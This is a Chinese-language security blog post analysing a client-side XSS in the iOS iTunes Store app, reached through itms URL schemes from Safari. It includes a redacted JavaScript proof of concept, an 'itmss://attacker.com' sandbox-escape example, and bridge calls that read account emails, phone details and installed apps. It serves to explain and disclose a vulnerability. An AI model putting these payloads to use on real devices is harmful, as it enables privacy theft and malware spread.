---
title: 客户端XSS
top_img: https://s2.loli.net/2022/07/20/tOoYKRE7fMVdb6x.png
cover: https://developer.apple.com/xcode/images/screen-lighter-large_2x.png
date: 2022-07-21 11:25:16
tags:
    - 安全
    - 漏洞
    - 移动应用
    - iOS
categories: 安全
---

# PAC

自从 iPhone Xs 使用了 A12 芯片正式加入了 PAC，包括老牌的 Pwn2Own 在内的各种 0day 竞赛上就没有出现过成功的挑战，直到 2020 年的天府杯。当时的蚂蚁安全和 360 政企安全分别用两套完全不同的方案实现了远程攻击，在搭载了 iOS 14.2 的系统上通过 Safari 浏览器作为入口，绕过浏览器沙箱执行任意代码并窃取敏感信息。

绝大多数的 full chain exploit 都是先获取沙箱内任意代码执行，再逃逸沙箱；本文用到链条非常特殊，先绕过沙箱向一个系统自带 App 注入任意 javascript 代码，然后直接在 app 中获取完全的 shellcode 执行，也就是和 App 同等的权限，可以访问 Apple ID、通讯录、摄像头等敏感的信息。

更为有意思的是，在这个 js 环境中，不仅兼容已有的任何一个 WebKit 漏洞利用（无论是否是 JIT 类型的漏洞），还额外引入了攻击面。靠着额外的攻击面结合多个系统安全机制的绕过，最终可以实现任意代码执行。

一个漏洞非常有意思，本质上是一个客户端的 XSS。但要找到这个 XSS，不仅 fuzz 行不通，哪怕是代码审计也得看二进制代码，也就是要求同时具备逆向工程和 web 漏洞的背景知识。光是反编译 dyld_shared_cache 就能劝退一大批人。

输入向量是大家熟悉的 URL scheme。URL scheme 可以从浏览器跳转到本地 app，在跳转前会提示用户。但 iOS 在代码里硬编码了一个信任名单，可以免确认跳转：
### Allow List of MobileSafari
``` obj-c
bool -[_SFNavigationResult isRedirectToAppleServices(_SFNavigationResult
*self, SEL a2)
{
bundle = self->_externalApplication.bundleIdentifier;
return [bundle isEqualToString:@"com.apple.AppStore"]
[bundle isEqualToString:@"com.apple.AppStore"]
[bundle isEqualToString:@"com.apple.MobileStore"]
[bundle isEqualToString:@"com.apple.Music"] 
[bundle isEqualToString:@"com.apple.news"]
}
```
这给漏洞的利用带来了很大便利。

早在 2014 年就有韩国黑客 lokihardt 在 Pwn2Own 上用过这个攻击面，通过一个特殊的 URL 在本地 app 打开了任意网址，结合另一个 WebKit 的 Use-After-Free 漏洞即可在沙箱外运行任意代码。第一步的逃逸很简单：

>itmss://attacker.com

当时并没有限制域名，直接给一个 URL 就能打开。这个问题就是CVE-2014-8840。

之后 iOS 加入了域名白名单。每次启动 iTunes Store 时都会拉取一个 XML 配置文件，只有后缀满足其中 trustedDomains 列表才会打开。然而紧接着又被打了一次，因为 lokihardt 找了个信任域名的 DOM xss。

一开始准备时也没想到真要搞 iOS。当时同事搞定了一个 iOS 和 mac 通用的 WebKit 读写利用WebAudio 组件，后来用在 macOS 的项目上，需要过沙箱，我就想起这个免确认跳转逃逸的点：
>its.detect.openltunes

然而测试发现 mac 上的应用已经换上了 WKWebView，意味着即使跳转过去任意代码执行，权限和 Safari 的无异。

### 全局开启 iOS/Mac 的WebView调试

全局调试工具起到很大用处。随手在控制台里测试了一些代码就找到了一个 UAF。开始逆向代码，又发现 WebView 里隐藏的各种强大的接口，可以直接弹计算器。最后考虑效果最佳化，还是完全使用 iTunes 的漏洞完成了 iOS 的项目利用测试。

一开始的思路放在信任域的 XSS 上，但被动扫描器看了几天也没进展。又掏出 IDA 在漫天的代码里看，终于在这几个方法里发现了彩蛋。

· -[SUStoreController handleApplicationURL:]
· -[NSURL storeURLType]
· -[SUStoreController _handleAccountURL:]
· -[SKUIURL initWithURL:]

iTunes Store 本地有一个逻辑，当 querystring 出现特殊的参数时，URL 的 hostname 就会被忽略掉，而是直接取出参数里的第二个 url，在一个浮层里加载：
``` url
itms://<马赛克>&url=http://www.apple.com
```
在这里 URL 仍然具有域名信任检查，但已不要求使用 https，可以中间人了。让人不解的是，在反编译代码里发现了一段神奇的逻辑。当参数是一个 data URI 时，同样认为这是一个受信任的域。

data URI 可以直接插入任意 html，所以这个点就变成了一个反射型 XSS，还是必须要逆向才能找到的 XSS。

程序还有一个逻辑是会尝试对 querystring 的参数重新赋值，最终的 data URI 永远会被贴上一个额外的问号字符。如果使用 base64 编码，payload 就会被破坏掉；而 text/plain 不受影响，只是会在 body 结尾多出来一个字符而已。

``` javascript
String.prototype.toDataURI = function() {
  return 'data:text/html;,' + encodeURIComponent(this).replace(/[!'()*]/g, escape);
}

function payload() {  
  iTunes.alert('gotcha'); // do ya thing
}

const data = `<script type="application/javascript">(${payload})()<\/script>`.toDataURI()
const url = new URL('itms://<redacted>');
// part of the PoC is redacted to prevent abuse
url.searchParams.set('url', data);
location = url
```

因此通过以上简单的参数构造，就可以生成这样的一个特殊的 itms URL，能从 Safari 直接跳转到本地应用并执行任意 js。

由于漏洞从 iOS 3 引入，直到 iOS 14.4 才被修复，影响范围过于夸张，以上提供的 PoC 并不是完整的。一些关键参数已被删除。

在 iOS 14 上，这个 iTunes 具有 dynamic-codesigning 权限。有一些 iOS 程序员会误认为只有 WKWebView 才能使用 just-in-time 优化，但是实际上这只跟 JavaScriptCore 当前所在进程是否有特殊的 entitlement 来控制。

这样一来这个 XSS 之后进入了一个特殊的环境。渲染的控件叫 SUWebView，是过时的 UIWebView 的子类，没有独立的渲染器进程。然而这个环境允许 JIT，所以有机会加载任意 shellcode。任意一个有效的 WebKit 的漏洞都可以在这个 WebView 被利用。

除此之外，SUWebView 本身用的 JavaScript bridge 引入了新的攻击面，至少在这一步可以直接用 js 获取相当多的信息。

SUWebView 使用的是过时的 WebScripting API，将 SUScriptInterface 类的方法导出到 js 上下文中。这些 API 被放在全局作用域的 iTunes 命名空间里。
``` obj-c
Tunes.systemVersion() //获取系统版本号
iTunes.primaryAccount?.identifier //获取 App Store 账号的邮箱
iTunes.primaryiCloudAccount?.identifier //获取 iCloud 账号的邮箱
iTunes.diskSpaceAvailable() //存储可用空间
iTunes.telephony //电话号码、运营商等信息
iTunes.installedSoftwareApplications //所有已安装的 app 信息
```
另外从这个 WebView 向任意域名发起 HTTP 请求，都会带上额外的 AppStore 认证信息，包括 icloud-dsid, x-mme-client-info, x-apple-adsid, x-apple-i-md-m, x-apple-i-md 等。

利用上述漏洞可以是的Safari绕过验证程序跳转到任意app执行一次触摸操作，多次执行便可通过iMessage向他人发送恶意代码实现传播。

``` javascript
const app = iTunes.softwareApplicationWithBundleID_('com.apple.calculator')app.launchWithURL_options_suspended_('calc://1337', {}, false);
```

